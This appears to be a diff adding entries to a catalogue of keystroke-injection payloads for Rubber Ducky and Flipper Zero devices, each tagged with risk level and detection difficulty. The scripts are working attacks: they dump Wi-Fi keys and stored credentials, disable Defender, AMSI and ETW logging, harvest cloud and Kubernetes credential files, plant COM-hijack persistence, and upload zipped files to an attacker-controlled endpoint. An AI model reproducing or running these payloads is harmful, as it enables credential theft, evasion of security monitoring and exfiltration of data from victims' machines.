+STRING $o="$env:TEMP\\fz_$(Get-Date -Format 'HHmmss').txt";$h=$env:COMPUTERNAME;$u=$env:USERNAME;"=== $h\\$u ===" | Out-File $o;"=== WIFI ===" | Out-File $o -A;(netsh wlan show profiles)|Select-String ":(.+)$"|%{$n=$_.Matches.Groups[1].Value.Trim();$p=(netsh wlan show profile name="$n" key=clear)|Select-String "Key Content\\s+:\\s+(.+)$";if($p){"$n = $($p.Matches.Groups[1].Value.Trim())"}else{"$n = (none)"}}|Out-File $o -A;"=== CREDS ===" | Out-File $o -A;cmdkey /list|Out-File $o -A;"=== RDP ===" | Out-File $o -A;Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Terminal Server Client\\Servers\\*' -EA 0|%{$_.PSChildName+" = "+$_.UsernameHint}|Out-File $o -A
+ENTER`
+  },
+  {
+    id: 'flipper-disable-defenses',
+    name: 'Flipper: Defense Evasion Suite',
+    category: 'evasion',
+    description: 'Flipper Zero payload that disables Windows Defender, AMSI, and execution policy in sequence. Requires admin for Defender changes. All-in-one evasion.',
+    targetOS: ['windows'],
+    riskLevel: 'critical',
+    executionTime: '~8s',
+    detectionDifficulty: 'hard',
+    format: 'flipper',
+    flipperCompat: true,
+    script: `ID 1234:5678
+REM Flipper Zero - Defense Evasion Suite
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -NoProfile
+ENTER
+DELAY 1500
+STRING $a=[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msiUtils');$f=$a.GetField('amsi'+[char]73+'nitFailed','NonPublic,Static');$f.SetValue($null,$true);Set-ExecutionPolicy Bypass -Scope Process -Force;Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command Set-MpPreference -DisableRealtimeMonitoring $true -Force;Add-MpPreference -ExclusionPath $env:TEMP -Force;Add-MpPreference -ExclusionProcess powershell.exe -Force;\"Defenses disabled\" | Out-File $env:TEMP\\defenses.log' -Verb RunAs
+ENTER`
+  },
+  {
+    id: 'flipper-linux-recon',
+    name: 'Flipper: Linux Quick Recon',
+    category: 'recon',
+    description: 'Flipper Zero BadUSB Linux reconnaissance payload. Opens terminal and dumps system info, network, users, and SUID binaries.',
+    targetOS: ['linux'],
+    riskLevel: 'low',
+    executionTime: '~10s',
+    detectionDifficulty: 'easy',
+    format: 'flipper',
+    flipperCompat: true,
+    script: `ID 1234:5678
+REM Flipper Zero - Linux Quick Recon
+DELAY 1000
+CTRL-ALT t
+DELAY 1000
+STRING o=/tmp/fz_recon.txt;echo "=== $(hostname) ===" > $o;uname -a >> $o;echo "=== NET ===" >> $o;ip addr 2>/dev/null||ifconfig >> $o;echo "=== USERS ===" >> $o;cat /etc/passwd|grep -v nologin >> $o;echo "=== SUID ===" >> $o;find / -perm -4000 -type f 2>/dev/null >> $o;echo "=== SUDO ===" >> $o;sudo -l 2>/dev/null >> $o;cat $o
+ENTER`
+  },
+  {
+    id: 'flipper-macos-recon',
+    name: 'Flipper: macOS Quick Recon',
+    category: 'recon',
+    description: 'Flipper Zero BadUSB macOS reconnaissance payload. Opens Terminal via Spotlight and dumps system info, network, users, and installed apps.',
+    targetOS: ['macos'],
+    riskLevel: 'low',
+    executionTime: '~10s',
+    detectionDifficulty: 'easy',
+    format: 'flipper',
+    flipperCompat: true,
+    script: `ID 1234:5678
+REM Flipper Zero - macOS Quick Recon
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 1000
+STRING o=/tmp/fz_recon.txt;echo "=== $(hostname) ===" > $o;sw_vers >> $o;echo "=== NET ===" >> $o;ifconfig >> $o;echo "=== USERS ===" >> $o;dscl . list /Users|grep -v '^_' >> $o;echo "=== APPS ===" >> $o;ls /Applications >> $o;echo "=== SIP ===" >> $o;csrutil status >> $o;open $o
+ENTER`
+  },
+
+  // ==================== ADDITIONAL RECON & NETWORK SCRIPTS ====================
+  {
+    id: 'recon-domain-computers',
+    name: 'Domain Computer Enumeration',
+    category: 'recon',
+    description: 'Enumerates all computers in the Active Directory domain using ADSI queries. Lists hostnames, OS versions, and last logon times for lateral movement targeting.',
+    targetOS: ['windows'],
+    riskLevel: 'medium',
+    executionTime: '~15s',
+    detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Domain Computer Enumeration
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\domain_computers.txt"; "=== DOMAIN COMPUTERS ===" | Out-File $out; try { $searcher = [adsisearcher]"(objectCategory=computer)"; $searcher.PropertiesToLoad.AddRange(@('cn','operatingsystem','operatingsystemversion','lastlogontimestamp','dnshostname')); $searcher.FindAll() | ForEach-Object { [PSCustomObject]@{ Name=$_.Properties['cn'][0]; OS=$_.Properties['operatingsystem'][0]; Version=$_.Properties['operatingsystemversion'][0]; DNS=$_.Properties['dnshostname'][0]; LastLogon=[datetime]::FromFileTime($_.Properties['lastlogontimestamp'][0]) } } | Sort-Object Name | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append } catch { "Not domain joined or ADSI query failed: $_" | Out-File $out -Append }; Invoke-Item $out
+ENTER`
+  },
+  {
+    id: 'recon-gpresult',
+    name: 'Group Policy Enumeration',
+    category: 'recon',
+    description: 'Generates a full Group Policy results report showing applied GPOs, security settings, software restrictions, and script policies for the current user and computer.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~20s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Group Policy Enumeration
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\gpo_report.html"; gpresult /h $out /f 2>$null; if(Test-Path $out){ Invoke-Item $out } else { $txt = "$env:TEMP\\gpo_report.txt"; "=== GP RESULT ===" | Out-File $txt; gpresult /r | Out-File $txt -Append; "=== APPLIED GPOS ===" | Out-File $txt -Append; gpresult /z 2>$null | Out-File $txt -Append; Invoke-Item $txt }
+ENTER`
+  },
+  {
+    id: 'net-arp-scan',
+    name: 'ARP-Based Host Discovery',
+    category: 'network',
+    description: 'Performs ARP-based host discovery on the local subnet by pinging all addresses and reading the ARP cache. Faster and stealthier than port scanning.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~30s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM ARP-Based Host Discovery
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\arp_scan.txt"; $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' -and $_.PrefixOrigin -ne 'WellKnown' } | Select-Object -First 1); $subnet = $ip.IPAddress -replace '\\d+$',''; "=== ARP SCAN $(Get-Date) ===" | Out-File $out; "Local: $($ip.IPAddress)" | Out-File $out -Append; "Scanning $($subnet)1-254..." | Out-File $out -Append; $jobs = 1..254 | ForEach-Object { $t = "$subnet$_"; Start-Job -ScriptBlock { param($target) Test-Connection $target -Count 1 -Quiet -TimeoutSeconds 1 } -ArgumentList $t }; $jobs | Wait-Job -Timeout 30 | Out-Null; "=== ARP TABLE ===" | Out-File $out -Append; Get-NetNeighbor -AddressFamily IPv4 | Where-Object { $_.State -ne 'Unreachable' } | Select-Object IPAddress, LinkLayerAddress, State | Sort-Object IPAddress | Format-Table -AutoSize | Out-String | Out-File $out -Append; $jobs | Remove-Job -Force; Invoke-Item $out
+ENTER`
+  },
+  {
+    id: 'cred-cloud-tokens',
+    name: 'Cloud Credential & Token Finder',
+    category: 'credentials',
+    description: 'Searches for cloud provider credentials: AWS credentials/config, Azure tokens, GCP service account keys, Docker configs, and Kubernetes kubeconfig files.',
+    targetOS: ['windows'],
+    riskLevel: 'high',
+    executionTime: '~10s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Cloud Credential & Token Finder
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\cloud_creds.txt"; "=== CLOUD CREDENTIAL SCAN ===" | Out-File $out; $checks = @{AWS_Creds="$env:USERPROFILE\\.aws\\credentials"; AWS_Config="$env:USERPROFILE\\.aws\\config"; Azure_Profile="$env:USERPROFILE\\.azure\\azureProfile.json"; Azure_Tokens="$env:USERPROFILE\\.azure\\accessTokens.json"; GCP_ADC="$env:APPDATA\\gcloud\\application_default_credentials.json"; GCP_Creds="$env:APPDATA\\gcloud\\credentials.db"; Docker_Config="$env:USERPROFILE\\.docker\\config.json"; Kube_Config="$env:USERPROFILE\\.kube\\config"; NPM_RC="$env:USERPROFILE\\.npmrc"; NuGet_Config="$env:APPDATA\\NuGet\\NuGet.Config"; Git_Creds="$env:USERPROFILE\\.git-credentials"; Terraform="$env:APPDATA\\terraform.d\\credentials.tfrc.json"}; foreach($name in $checks.Keys){ $path = $checks[$name]; if(Test-Path $path){ [Environment]::NewLine + "=== $name === ($path)" | Out-File $out -Append; "Size: $((Get-Item $path).Length) bytes" | Out-File $out -Append; "Modified: $((Get-Item $path).LastWriteTime)" | Out-File $out -Append; Get-Content $path -ErrorAction SilentlyContinue | Select-Object -First 20 | Out-File $out -Append } else { "$name : not found" | Out-File $out -Append } }; Invoke-Item $out
+ENTER`
+  },
+  {
+    id: 'exfil-staged-upload',
+    name: 'Staged File Upload via PowerShell',
+    category: 'exfiltration',
+    description: 'Compresses staged files into a ZIP archive and uploads via HTTP POST to an attacker-controlled server. Replace UPLOAD_URL. Includes progress tracking.',
+    targetOS: ['windows'],
+    riskLevel: 'critical',
+    executionTime: '~15s',
+    detectionDifficulty: 'hard',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Staged File Upload
+REM Replace UPLOAD_URL_HERE with your upload endpoint
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $stage = "$env:TEMP\\doc_stage"; $zip = "$env:TEMP\\exfil_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"; $url = 'UPLOAD_URL_HERE'; if(Test-Path $stage){ Compress-Archive -Path "$stage\\*" -DestinationPath $zip -Force; $size = [math]::Round((Get-Item $zip).Length/1MB,2); "Archive: $zip ($size MB)" | Out-File "$env:TEMP\\upload.log"; try { $bytes = [IO.File]::ReadAllBytes($zip); $wc = New-Object System.Net.WebClient; $wc.Headers.Add("Content-Type","application/octet-stream"); $wc.Headers.Add("X-Hostname",$env:COMPUTERNAME); $resp = $wc.UploadData($url, $bytes); "Upload complete: $([Text.Encoding]::UTF8.GetString($resp))" | Out-File "$env:TEMP\\upload.log" -Append } catch { "Upload failed: $_" | Out-File "$env:TEMP\\upload.log" -Append } } else { "No staged files found" | Out-File "$env:TEMP\\upload.log" }
+ENTER
+DELAY 2000
+STRING exit
+ENTER`
+  },
+  {
+    id: 'persist-com-hijack',
+    name: 'COM Object Hijack Persistence',
+    category: 'persistence',
+    description: 'Hijacks a COM object registration in HKCU to execute a payload when the COM object is loaded by legitimate software. Fileless persistence via registry.',
+    targetOS: ['windows'],
+    riskLevel: 'high',
+    executionTime: '~4s',
+    detectionDifficulty: 'very-hard',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM COM Object Hijack Persistence
+REM Hijacks a frequently-loaded COM CLSID
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $clsid = '{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}'; $regPath = "HKCU:\\Software\\Classes\\CLSID\\$clsid\\InprocServer32"; New-Item -Path $regPath -Force | Out-Null; Set-ItemProperty -Path $regPath -Name '(Default)' -Value 'C:\\Windows\\Temp\\payload.dll' -Force; Set-ItemProperty -Path $regPath -Name 'ThreadingModel' -Value 'Both' -Force; if(Test-Path $regPath){ "COM hijack installed at $regPath" | Out-File "$env:TEMP\\com_hijack.log"; Get-ItemProperty $regPath | Format-List | Out-String | Out-File "$env:TEMP\\com_hijack.log" -Append } else { "FAILED" | Out-File "$env:TEMP\\com_hijack.log" }
+ENTER
+DELAY 1000
+STRING exit
+ENTER`
+  },
+  {
+    id: 'evasion-etw-bypass',
+    name: 'ETW Tracing Bypass',
+    category: 'evasion',
+    description: 'Patches Event Tracing for Windows (ETW) in the current process to prevent telemetry. Stops PowerShell script block logging and module logging in the session.',
+    targetOS: ['windows'],
+    riskLevel: 'high',
+    executionTime: '~3s',
+    detectionDifficulty: 'very-hard',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM ETW Tracing Bypass
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider'); if($etw){ $field = $etw.GetField('etwProvider','NonPublic,Static'); $prov = $field.GetValue($null); $field2 = $prov.GetType().GetField('m_enabled','NonPublic,Instance'); $field2.SetValue($prov,0); "ETW provider disabled" } else { "ETW type not found - trying alternative" }; [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0) 2>$null; "Script block logging disabled for this session"
+ENTER`
+  },
+  {
+    id: 'recon-antivirus-enum',
+    name: 'Antivirus & EDR Enumeration',
+    category: 'recon',
+    description: 'Identifies installed antivirus, EDR, and security products by checking running processes, services, and registered AV providers. Maps detection capabilities.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~6s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Antivirus & EDR Enumeration
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\av_enum.txt"; "=== REGISTERED AV ===" | Out-File $out; Get-WmiObject -Namespace "root\\SecurityCenter2" -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select-Object displayName, productState, pathToSignedProductExe | Format-List | Out-String | Out-File $out -Append; "=== DEFENDER STATUS ===" | Out-File $out -Append; Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AMServiceEnabled, AntispywareEnabled, AntivirusEnabled, RealTimeProtectionEnabled, BehaviorMonitorEnabled, IoavProtectionEnabled, NISEnabled, OnAccessProtectionEnabled | Format-List | Out-String | Out-File $out -Append; "=== SECURITY PROCESSES ===" | Out-File $out -Append; $avProcs = @('MsMpEng','MpCmdRun','csfalconservice','cb','CylanceSvc','SentinelAgent','SentinelServiceHost','bdagent','avp','kavfs','ekrn','avgnt','avscan','mbam','WRSA','savservice','SEPMasterService','ccSvcHst','tmlisten','ntrtscan','ds_agent','xagt','taniumclient','lacuna','elastic-agent','winlogbeat','filebeat','sysmon'); Get-Process | Where-Object { $avProcs -contains $_.Name } | Select-Object Name, Id, Path | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; "=== SECURITY SERVICES ===" | Out-File $out -Append; Get-Service | Where-Object { $_.DisplayName -match 'defend|sentinel|crowd|carbon|cylance|kaspersky|norton|mcafee|sophos|trend|elastic|sysmon|splunk' } | Select-Object Name, DisplayName, Status | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; Invoke-Item $out
+ENTER`
   }
 ]
